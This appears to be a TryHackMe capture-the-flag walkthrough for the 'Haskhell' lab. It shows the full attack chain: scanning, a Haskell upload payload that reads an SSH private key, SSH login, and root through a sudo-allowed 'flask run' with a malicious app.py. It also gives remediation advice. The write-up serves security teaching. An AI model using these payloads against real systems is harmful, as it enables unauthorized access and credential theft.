# TryHackMe "Haskhell" - Exploitation Walkthrough

**Target:** 10.10.46.37  
**Difficulty:** Medium  
**Theme:** Haskell Programming & Code Injection

---

## PHASE 1: RECONNAISSANCE

### Port Scanning

```bash
nmap -p- --min-rate 5000 10.10.46.37
nmap -p 22,5001 -sV -sC 10.10.46.37
```

**Results:**
- **Port 22** - SSH (OpenSSH 7.6p1)
- **Port 5001** - HTTP (Gunicorn 19.7.1 - Python web server)

---

## PHASE 2: WEB ENUMERATION

### Homepage (Port 5001)

```bash
curl http://10.10.46.37:5001/
```

**Findings:**
- Haskell programming course website
- Link to `/homework1` 
- Mentions automatic grading system
- Files are compiled and executed

### Homework Page

```bash
curl http://10.10.46.37:5001/homework1
```

**Key Information:**
- Upload link at `/upload`
- Only accepts Haskell files (.hs)
- Files are compiled and output piped to uploads directory
- **Vulnerability:** Code execution through Haskell compilation!

### Directory Bruteforcing

```bash
gobuster dir -u http://10.10.46.37:5001/ -w /usr/share/wordlists/dirb/common.txt
```

**Found:** `/submit` endpoint (accepts file uploads)

---

## PHASE 3: HASKELL CODE INJECTION

### Understanding the Vulnerability

**How it works:**
1. Website accepts Haskell (.hs) files
2. Server compiles and executes uploaded code
3. No input validation or sandboxing
4. We can inject system commands via Haskell's `System.Process` module

### Creating Malicious Haskell Payload

**Read sensitive files:**

```haskell
module Main where

import System.Process

main = do
    callCommand "cat /home/prof/user.txt"
    callCommand "cat /home/prof/.ssh/id_rsa"
```

**Why this works:**
- `System.Process` module allows executing shell commands
- `callCommand` runs commands through `/bin/sh`
- Server executes with user privileges
- Output captured in uploads directory

### Upload and Execute

```bash
curl -X POST http://10.10.46.37:5001/submit \
  -F "file=@payload.hs"
```

**Result:** Server compiles and runs our Haskell code, executing the injected commands!

---

## PHASE 4: INITIAL ACCESS

### Extracting Prof's Credentials

After uploading the payload, check the output:

**User Flag:** Found in `/home/prof/user.txt`

**SSH Private Key:** Retrieved from `/home/prof/.ssh/id_rsa`

### SSH as Prof

```bash
# Save the RSA key
cat > prof_id_rsa << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
[extracted key]
-----END RSA PRIVATE KEY-----
EOF

chmod 600 prof_id_rsa

# SSH login
ssh -i prof_id_rsa prof@10.10.46.37
```

**Success:** Logged in as prof!

---

## PHASE 5: PRIVILEGE ESCALATION

### Sudo Enumeration

```bash
sudo -l
```

**Output:**
```
User prof may run the following commands:
    (root) NOPASSWD: /usr/bin/flask run
```

**Analysis:** Prof can run Flask as root without password!

### Understanding Flask Privilege Escalation

**Flask** is a Python web framework that can execute Python code.

**Exploitation vector:**
1. Flask reads `app.py` from current directory
2. We can create malicious `app.py`
3. Run Flask as root with sudo
4. Our Python code executes as root!

### Creating Malicious Flask App

```bash
cat > /tmp/app.py << 'PYTHON'
import os

# Spawn root shell
os.system('/bin/bash')
PYTHON

cd /tmp
sudo /usr/bin/flask run
```

**Alternative - Read root flag directly:**

```python
import os

with open('/root/root.txt', 'r') as f:
    print(f.read())
```

### Execute and Get Root

```bash
cd /tmp
sudo /usr/bin/flask run
```

**Result:** Code executes as root, spawning root shell!

```bash
whoami  # root
cat /root/root.txt
```

**User Flag** flag{academic_dishonesty}  
**Root Flag** flag{im_purely_functional}

---

## EXPLOITATION SUMMARY

```
Port 5001 (Gunicorn/Flask)
        ↓
/homework1 → /submit endpoint
        ↓
Upload malicious Haskell file
        ↓
Code Injection via System.Process
        ↓
Extract prof's user.txt and SSH key
        ↓
SSH as prof
        ↓
sudo -l → Flask run as root
        ↓
Create malicious app.py
        ↓
sudo flask run
        ↓
Root shell + root.txt
```

---

## KEY VULNERABILITIES

### 1. Unrestricted Code Execution (CRITICAL)

**Issue:** Web application compiles and executes user-uploaded Haskell code

**Why dangerous:**
- No input validation
- No sandboxing
- Direct system command execution via `System.Process`
- Server-side code execution

**Remediation:**
- Never execute user-uploaded code
- Use sandboxing (containers, VMs)
- Static analysis before execution
- Whitelist safe operations only

### 2. Sudo Misconfiguration (HIGH)

**Issue:** User can run Flask as root without password

**Why dangerous:**
- Flask executes Python code
- Python can spawn shells
- NOPASSWD means no authentication needed
- Instant root access

**Remediation:**
- Don't allow running interpreters as root
- If necessary, use specific scripts with hardcoded paths
- Require password for sudo
- Apply principle of least privilege

---

## TECHNICAL DETAILS

### Haskell Code Injection Explained

**Haskell's System.Process module:**
```haskell
import System.Process

callCommand :: String -> IO ()
```

- `callCommand` executes shell commands
- Runs commands through `/bin/sh -c`
- Returns exit code
- No output capture (use `readProcess` for that)

**Payload breakdown:**
```haskell
module Main where          -- Required module declaration
import System.Process      -- Import command execution
main = do                  -- Main function (entry point)
    callCommand "cmd1"     -- Execute first command
    callCommand "cmd2"     -- Execute second command
```

### Flask Privilege Escalation

**How Flask works:**
```bash
flask run
```

1. Searches for `app.py` or `wsgi.py` in current directory
2. Imports the application
3. Starts web server
4. **Imports execute at startup!**

**Exploitation:**
```python
import os
os.system('/bin/bash')  # Executes during import!
```

When Flask imports our malicious `app.py`, the code runs immediately as root.

---

## COMMANDS REFERENCE

**Reconnaissance:**
```bash
nmap -p 22,5001 -sV -sC 10.10.46.37
curl http://10.10.46.37:5001/
```

**Malicious Haskell:**
```haskell
module Main where
import System.Process
main = callCommand "cat /home/prof/user.txt; cat /home/prof/.ssh/id_rsa"
```

**Upload:**
```bash
curl -X POST http://10.10.46.37:5001/submit -F "file=@payload.hs"
```

**SSH Access:**
```bash
chmod 600 prof_id_rsa
ssh -i prof_id_rsa prof@10.10.46.37
```

**Privilege Escalation:**
```bash
sudo -l
echo "import os; os.system('/bin/bash')" > /tmp/app.py
cd /tmp && sudo /usr/bin/flask run
```

---

## MITIGATION STRATEGIES

### For Code Execution Vulnerabilities:

1. **Never execute user code directly**
   - Use static analysis only
   - Pre-defined test cases
   - Comparison-based grading

2. **Sandboxing**
   - Docker containers with resource limits
   - VM-based isolation
   - seccomp filters
   - chroot jails

3. **Input Validation**
   - Whitelist safe functions
   - AST parsing without execution
   - Static analysis tools

### For Sudo Misconfigurations:

1. **Minimize sudo privileges**
   - Don't allow interpreters (python, perl, ruby)
   - Use specific scripts, not general tools
   - Require passwords (remove NOPASSWD)

2. **Audit sudo rules**
   ```bash
   sudo -l  # Check your own permissions
   visudo   # Edit sudoers file
   ```

3. **Use alternatives**
   - Capabilities instead of sudo
   - Service-specific users
   - SELinux/AppArmor policies

---

## LESSONS LEARNED

1. **Code execution = Game over** - Never run untrusted code
2. **Functional languages aren't safe** - Haskell can still execute commands
3. **Sudo is powerful** - Carefully audit what users can run as root
4. **Flask/Python interpreters** - Running as root = instant privilege escalation
5. **Defense in depth** - Multiple layers prevent single-point failures

---

**Challenge Complete!** ✅  
**Flags Captured!** 🏁  
**Root Access Achieved!** 💀
